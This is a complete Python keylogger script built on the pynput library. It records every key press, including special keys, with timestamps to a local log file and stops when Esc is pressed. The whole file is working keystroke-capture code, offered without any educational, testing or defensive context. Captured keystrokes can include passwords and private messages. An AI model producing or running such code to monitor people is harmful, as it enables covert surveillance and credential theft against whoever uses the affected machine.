import logging
from pynput import keyboard

# Set up logging
logging.basicConfig(filename='keylog.log', level=logging.INFO, format='%(asctime)s: %(message)s')

def on_press(key):
    """Log key press"""
    try:
        logging.info(f'Key pressed: {key.char}')
    except AttributeError:
        logging.info(f'Special key pressed: {key}')

def on_release(key):
    """Stop keylogger when Esc key is pressed"""
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Create keyboard listener
listener = keyboard.Listener(on_press=on_press, on_release=on_release)

# Start listener
listener.start()
listener.join()
